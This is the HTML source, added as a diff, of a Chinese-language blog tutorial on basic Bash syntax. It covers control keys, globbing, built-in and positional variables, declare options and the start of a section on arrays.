@@ -1,0 +1,1012 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#ddd">
+<meta name="generator" content="Hexo 6.0.0">
+
+<link rel="preconnect" href="https://fonts.googleapis.com" crossorigin>
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#ddd">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="/lib/@fortawesome/fontawesome-free/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
+  <link rel="stylesheet" href="/lib/animate.css/animate.min.css" integrity="sha256-X7rrn44l1+AUO65h1LGALBbOc5C5bOstSYsNlv9MhT8=" crossorigin="anonymous">
+  <link rel="stylesheet" href="/lib/@fancyapps/fancybox/dist/jquery.fancybox.min.css" integrity="sha256-Vzbj7sDDS/woiFS3uNKo8eIuni59rjyNGtXfstRzStA=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"blog.imssyang.com","root":"/","images":"/images","scheme":"Mist","darkmode":false,"version":"8.9.0","exturl":false,"sidebar":{"position":"right","width":300,"display":"hide","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":true,"color":"rgba(255, 255, 255, 0.1)","save":"auto"},"mediumzoom":true,"lazyload":true,"pangu":true,"comments":{"style":"tabs","active":"disqus","storage":true,"lazyload":false,"nav":{"disqus":{"text":"Disqus","order":-1},"gitalk":{"text":"Github","order":-2}}},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":3,"unescape":true,"preload":true}}</script><script src="/js/config.js"></script>
+<meta name="description" content="Bash脚本基本语法.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Bash脚本">
+<meta property="og:url" content="https://blog.imssyang.com/ProgrammingLanguage/Bash/Basic.html">
+<meta property="og:site_name" content="Just Do It">
+<meta property="og:description" content="Bash脚本基本语法.">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2022-05-23T13:16:22.000Z">
+<meta property="article:modified_time" content="2024-04-20T17:25:14.907Z">
+<meta property="article:author" content="Ssyang">
+<meta property="article:tag" content="Bash">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://blog.imssyang.com/ProgrammingLanguage/Bash/Basic.html">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://blog.imssyang.com/ProgrammingLanguage/Bash/Basic.html","path":"ProgrammingLanguage/Bash/Basic.html","title":"Bash脚本"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Bash脚本 | Just Do It</title>
+  
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Just Do It</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">by Ssyang</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a></li>
+        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li>
+        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li>
+        <li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6"><span class="nav-number">1.</span> <span class="nav-text">特殊字符</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8E%A7%E5%88%B6%E5%AD%97%E7%AC%A6"><span class="nav-number">1.1.</span> <span class="nav-text">控制字符</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%80%9A%E9%85%8D%E7%AC%A6"><span class="nav-number">1.2.</span> <span class="nav-text">通配符</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%98%E9%87%8F"><span class="nav-number">2.</span> <span class="nav-text">变量</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%85%E5%BB%BA%E5%8F%98%E9%87%8F"><span class="nav-number">2.1.</span> <span class="nav-text">内建变量</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%89%B9%E6%AE%8A%E5%8F%98%E9%87%8F"><span class="nav-number">2.2.</span> <span class="nav-text">特殊变量</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A3%B0%E6%98%8E%E7%B1%BB%E5%9E%8B"><span class="nav-number">2.3.</span> <span class="nav-text">声明类型</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%95%B0%E7%BB%84"><span class="nav-number">2.3.1.</span> <span class="nav-text">数组</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%93%8D%E4%BD%9C"><span class="nav-number">2.4.</span> <span class="nav-text">字符串操作</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E6%95%B0%E4%BB%A3%E6%8D%A2"><span class="nav-number">2.5.</span> <span class="nav-text">参数代换</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%91%BD%E4%BB%A4%E4%BB%A3%E6%8D%A2"><span class="nav-number">2.6.</span> <span class="nav-text">命令代换</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AE%97%E6%9C%AF%E5%B1%95%E5%BC%80"><span class="nav-number">2.7.</span> <span class="nav-text">算术展开</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%97%B4%E6%8E%A5%E5%BC%95%E7%94%A8"><span class="nav-number">2.8.</span> <span class="nav-text">间接引用</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%B5%8B%E8%AF%95%E6%9D%A1%E4%BB%B6"><span class="nav-number">3.</span> <span class="nav-text">测试条件</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%95%B0%E5%80%BC%E6%AF%94%E8%BE%83"><span class="nav-number">3.1.</span> <span class="nav-text">数值比较</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%AF%94%E8%BE%83"><span class="nav-number">3.2.</span> <span class="nav-text">字符串比较</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%80%BB%E8%BE%91%E6%AF%94%E8%BE%83"><span class="nav-number">3.3.</span> <span class="nav-text">逻辑比较</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E6%B5%8B%E8%AF%95"><span class="nav-number">3.4.</span> <span class="nav-text">文件测试</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%8E%A7%E5%88%B6%E6%B5%81"><span class="nav-number">4.</span> <span class="nav-text">控制流</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BE%AA%E7%8E%AF%E4%BD%93"><span class="nav-number">4.1.</span> <span class="nav-text">循环体</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#for"><span class="nav-number">4.1.1.</span> <span class="nav-text">for</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#while"><span class="nav-number">4.1.2.</span> <span class="nav-text">while</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#until"><span class="nav-number">4.1.3.</span> <span class="nav-text">until</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#break"><span class="nav-number">4.1.4.</span> <span class="nav-text">break</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#continue"><span class="nav-number">4.1.5.</span> <span class="nav-text">continue</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9D%A1%E4%BB%B6%E5%88%86%E6%94%AF"><span class="nav-number">4.2.</span> <span class="nav-text">条件分支</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#case"><span class="nav-number">4.2.1.</span> <span class="nav-text">case</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#select"><span class="nav-number">4.2.2.</span> <span class="nav-text">select</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%9D%97"><span class="nav-number">5.</span> <span class="nav-text">代码块</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#HereDocument"><span class="nav-number">5.1.</span> <span class="nav-text">HereDocument</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%87%BD%E6%95%B0"><span class="nav-number">6.</span> <span class="nav-text">函数</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%85%E5%BB%BA%E5%87%BD%E6%95%B0"><span class="nav-number">6.1.</span> <span class="nav-text">内建函数</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#RANDOM"><span class="nav-number">6.1.1.</span> <span class="nav-text">$RANDOM</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%BD%91%E7%BB%9C"><span class="nav-number">7.</span> <span class="nav-text">网络</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#tcp"><span class="nav-number">7.1.</span> <span class="nav-text">tcp</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%89%A7%E8%A1%8C%E9%80%89%E9%A1%B9"><span class="nav-number">8.</span> <span class="nav-text">执行选项</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%A4%96%E9%83%A8%E5%91%BD%E4%BB%A4"><span class="nav-number">9.</span> <span class="nav-text">外部命令</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#sed"><span class="nav-number">9.1.</span> <span class="nav-text">sed</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#awk"><span class="nav-number">9.2.</span> <span class="nav-text">awk</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="nav-number">10.</span> <span class="nav-text">参考资料</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Ssyang"
+      src="/images/imssyang/windmill.png">
+  <p class="site-author-name" itemprop="name">Ssyang</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">31</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">23</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">30</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author site-overview-item animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/imssyang" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;imssyang" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:imssyang@gmail.com" title="E-Mail → mailto:imssyang@gmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+  <div class="cc-license site-overview-item animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" class="cc-opacity" rel="noopener" target="_blank"><img src="/lib/@creativecommons/vocabulary/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+  <div class="links-of-blogroll site-overview-item animated">
+    <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://www.dabeaz.com/" title="https:&#x2F;&#x2F;www.dabeaz.com" rel="noopener" target="_blank">David Beazley</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://coldattic.info/" title="http:&#x2F;&#x2F;coldattic.info" rel="noopener" target="_blank">A Foo Walks into a Bar...</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.brendangregg.com/" title="https:&#x2F;&#x2F;www.brendangregg.com" rel="noopener" target="_blank">Brendan Gregg's Homepage</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.wowza.com/blog" title="https:&#x2F;&#x2F;www.wowza.com&#x2F;blog" rel="noopener" target="_blank">WOWZA Media Systems</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://preshing.com/" title="https:&#x2F;&#x2F;preshing.com" rel="noopener" target="_blank">Preshing on Programming</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.yinwang.org/" title="https:&#x2F;&#x2F;www.yinwang.org" rel="noopener" target="_blank">当然我在扯淡</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://blog.jianchihu.net/" title="https:&#x2F;&#x2F;blog.jianchihu.net" rel="noopener" target="_blank">剑痴乎</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://betterexplained.com/" title="https:&#x2F;&#x2F;betterexplained.com" rel="noopener" target="_blank">Better Explained</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.mathsisfun.com/" title="https:&#x2F;&#x2F;www.mathsisfun.com" rel="noopener" target="_blank">Math is Fun</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://notes.shichao.io/" title="https:&#x2F;&#x2F;notes.shichao.io" rel="noopener" target="_blank">Shichao's Notes</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.shuxuele.com/" title="https:&#x2F;&#x2F;www.shuxuele.com" rel="noopener" target="_blank">数学乐</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://thispointer.com/" title="https:&#x2F;&#x2F;thispointer.com" rel="noopener" target="_blank">thisPointer</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://refactoring.guru/" title="https:&#x2F;&#x2F;refactoring.guru" rel="noopener" target="_blank">Refactoring.Guru</a>
+        </li>
+    </ul>
+  </div>
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://blog.imssyang.com/ProgrammingLanguage/Bash/Basic.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/imssyang/windmill.png">
+      <meta itemprop="name" content="Ssyang">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Just Do It">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Bash脚本
+            <div class="post-categories">
+              [
+                  <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                    <a href="/categories/ProgrammingLanguage/Bash/" itemprop="url" rel="index"><span itemprop="name">Bash</span></a>
+                  </span>
+              ]
+            </div>
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 5/23/2022 21:16:22" itemprop="dateCreated datePublished" datetime="2022-05-23T21:16:22+08:00">5/23/2022</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 4/21/2024 01:25:14" itemprop="dateModified" datetime="2024-04-21T01:25:14+08:00">4/21/2024</time>
+    </span>
+
+  
+    <span class="post-meta-item" title="Symbols count in article">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">Symbols count in article: </span>
+      <span>10k</span>
+    </span>
+    <span class="post-meta-item" title="Reading time">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">Reading time &asymp;</span>
+      <span>9 mins.</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <p>Bash脚本基本语法.</p>
+<span id="more"></span>
+
+<h1 id="特殊字符"><a href="#特殊字符" class="headerlink" title="特殊字符"></a>特殊字符</h1><h2 id="控制字符"><a href="#控制字符" class="headerlink" title="控制字符"></a>控制字符</h2><ul>
+<li>以<code>Control + key</code>组合方式表示</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th align="left">按键</th>
+<th align="left">含义</th>
+<th align="left">八进制</th>
+<th align="left">十六进制</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">A</td>
+<td align="left">移到行首</td>
+<td align="left"></td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">E</td>
+<td align="left">移到行尾</td>
+<td align="left"></td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">B</td>
+<td align="left">左移一个字符</td>
+<td align="left"></td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">F</td>
+<td align="left">右移一个字符</td>
+<td align="left"></td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">T</td>
+<td align="left">颠倒光标下字符和左侧一个字符</td>
+<td align="left"></td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">D</td>
+<td align="left">擦除光标下字符&#x2F;exit</td>
+<td align="left"></td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">H</td>
+<td align="left">擦除光标左侧字符</td>
+<td align="left"></td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">W</td>
+<td align="left">擦除光标左侧一个单词</td>
+<td align="left"></td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">K</td>
+<td align="left">擦除光标字符到行尾</td>
+<td align="left"></td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">U</td>
+<td align="left">擦除光标字符到行首</td>
+<td align="left"></td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">J</td>
+<td align="left">新行</td>
+<td align="left">\012</td>
+<td align="left">\x0a</td>
+</tr>
+<tr>
+<td align="left">M</td>
+<td align="left">回车符</td>
+<td align="left">\015</td>
+<td align="left">\x0d</td>
+</tr>
+<tr>
+<td align="left">V</td>
+<td align="left">允许插入控制字符，例如插入新行<code>&lt;Ctl-V&gt;&lt;Ctl-J&gt;</code></td>
+<td align="left"></td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">P</td>
+<td align="left">切换历史命令</td>
+<td align="left"></td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">R</td>
+<td align="left">搜索历史命令</td>
+<td align="left"></td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">C</td>
+<td align="left">终止一个前台job</td>
+<td align="left"></td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">Z</td>
+<td align="left">暂停一个前台job</td>
+<td align="left"></td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">Q</td>
+<td align="left">恢复stdin</td>
+<td align="left"></td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">S</td>
+<td align="left">冻结stdin</td>
+<td align="left"></td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">L</td>
+<td align="left">清屏</td>
+<td align="left"></td>
+<td align="left"></td>
+</tr>
+</tbody></table>
+<h2 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h2><ul>
+<li>Bash自身只支持通配符（globbing），有两种标识：<code>*</code>和<code>?</code></li>
+<li>Bash中执行的命令（grep、expr、sed、awk等）会支持正则表达式</li>
+</ul>
+<div class="tabs" id="bashglobbing"><ul class="nav-tabs"><li class="tab active"><a href="#bashglobbing-1">Globbing</a></li></ul><div class="tab-content"><div class="tab-pane active" id="bashglobbing-1"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">ls</span> t?.sh</span><br><span class="line">t2.sh</span><br><span class="line"></span><br><span class="line">$ <span class="built_in">ls</span> [ab]*</span><br><span class="line">a.1</span><br><span class="line">b.1</span><br><span class="line"></span><br><span class="line">$ <span class="built_in">ls</span> [a-c]*</span><br><span class="line">a.1</span><br><span class="line">b.1</span><br><span class="line">c.1</span><br><span class="line"></span><br><span class="line">$ <span class="built_in">ls</span> [^ab]*</span><br><span class="line">c.1</span><br><span class="line">t2.sh</span><br><span class="line">test1.txt</span><br><span class="line"></span><br><span class="line">$ <span class="built_in">ls</span> &#123;b*,c*,*est*&#125;</span><br><span class="line">b.1</span><br><span class="line">c.1</span><br><span class="line">test1.txt</span><br></pre></td></tr></table></figure></div></div></div>
+
+<h1 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h1><ul>
+<li>Bash的变量通常为字符串类型</li>
+<li>当变量的值为只包含数字的字符串时，根据上下文情况也允许算术运算和比较操作</li>
+</ul>
+<h2 id="内建变量"><a href="#内建变量" class="headerlink" title="内建变量"></a>内建变量</h2><table>
+<thead>
+<tr>
+<th align="left">变量名</th>
+<th align="left">含义</th>
+<th align="left">示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">$BASH</td>
+<td align="left">Bash程序路径</td>
+<td align="left">&#x2F;bin&#x2F;bash</td>
+</tr>
+<tr>
+<td align="left">$BASH_ENV</td>
+<td align="left">调用脚本时执行的启动文件路径</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">$BASHPID</td>
+<td align="left">当前实例的进程ID</td>
+<td align="left">10293</td>
+</tr>
+<tr>
+<td align="left">$CDPATH</td>
+<td align="left">cd命令可用的搜索路径列表</td>
+<td align="left">&#x2F;root&#x2F;.local&#x2F;share:&#x2F;opt</td>
+</tr>
+<tr>
+<td align="left">$EDITOR</td>
+<td align="left">脚本默认调用的编辑器</td>
+<td align="left">vi</td>
+</tr>
+<tr>
+<td align="left">$IFS</td>
+<td align="left">内部字段分隔符（默认空白字符）</td>
+<td align="left"><code>set x y z; IFS=&quot;-;&quot;; echo &quot;$*&quot;</code> -&gt; x-y-z</td>
+</tr>
+</tbody></table>
+<h2 id="特殊变量"><a href="#特殊变量" class="headerlink" title="特殊变量"></a>特殊变量</h2><ul>
+<li>参数变量用在脚本或函数的调用上</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th align="left">名称</th>
+<th align="left">含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">$0 $1 $2 …</td>
+<td align="left">参数的值，<code>$0</code>为脚本或函数名称，<code>$1</code>为第一个参数，…</td>
+</tr>
+<tr>
+<td align="left">$#</td>
+<td align="left">参数的数量（不含<code>$0</code>）</td>
+</tr>
+<tr>
+<td align="left">$*</td>
+<td align="left">所有位置参数（整体为一个字符串）</td>
+</tr>
+<tr>
+<td align="left">$@</td>
+<td align="left">所有位置参数（每个参数为一个字符串）</td>
+</tr>
+<tr>
+<td align="left">$$</td>
+<td align="left">脚本本身的进程ID</td>
+</tr>
+<tr>
+<td align="left">$!</td>
+<td align="left">最后一个后台运行job的进程ID</td>
+</tr>
+<tr>
+<td align="left">$?</td>
+<td align="left">命令或函数的退出状态</td>
+</tr>
+</tbody></table>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">f</span></span>() &#123; <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$#</span>:<span class="variable">$0</span>|<span class="variable">$1</span>|<span class="variable">$2</span>|<span class="variable">$3</span>:$*:<span class="variable">$@</span>&quot;</span> &#125;</span><br><span class="line">f 1 2 3 <span class="comment"># 3:f|1|2|3:1 2 3:1 2 3</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="声明类型"><a href="#声明类型" class="headerlink" title="声明类型"></a>声明类型</h2><ul>
+<li><code>declare</code>或<code>typeset</code>允许修改变量的属性：readonly、integer、array、…</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th align="left">语句</th>
+<th align="left">含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><code>declare -r va=1</code></td>
+<td align="left">声明只读变量va</td>
+</tr>
+<tr>
+<td align="left"><code>declare -i vb</code></td>
+<td align="left">声明整型变量vb</td>
+</tr>
+<tr>
+<td align="left"><code>declare -a vc</code></td>
+<td align="left">声明数组变量vc</td>
+</tr>
+<tr>
+<td align="left"><code>declare -x vd</code></td>
+<td align="left">声明可在脚本外部使用的变量</td>
+</tr>
+<tr>
+<td align="left"><code>declare -f [func_name]</code></td>
+<td align="left">列出脚本中定义的函数（省略函数名时列出所有函数）</td>
+</tr>
+</tbody></table>
+<h3 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h3><ul>
+<li>数组元素不需要是连续或邻近的，稀疏性质常常是有用的</li>
+<li>数组中的元素可以是未初始化的，允许空白，从0开始索引</li>
+</ul>
